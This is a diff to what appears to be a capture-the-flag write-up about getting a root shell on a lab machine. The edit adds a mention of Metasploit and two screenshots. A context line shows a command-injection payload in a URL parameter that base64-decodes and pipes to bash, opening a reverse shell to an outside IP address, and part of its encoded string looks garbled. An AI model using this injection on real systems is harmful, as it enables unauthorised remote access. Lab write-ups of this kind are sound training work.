@@ -205,4 +205,10 @@ like '+' %2b,  '=' %3d.
 u=acl%2Fapt&u=$(echo${IFS}YmFzaCAtYyAiYmFzaCAtaSA%2bcat JiAvZGV2L3RjcC8xMC4xMC4xNi42LzQ0MyAwPiYxIg%3d%3d|base64${IFS}-d|bash)
 ```
 
+Of course, we can use the msf
+
+Then we can get the root shell.
+![](images/Pasted%20image%2020240921105610.png)
+![](images/Pasted%20image%2020240921105518.png)
+
 Then we can get the root shell.
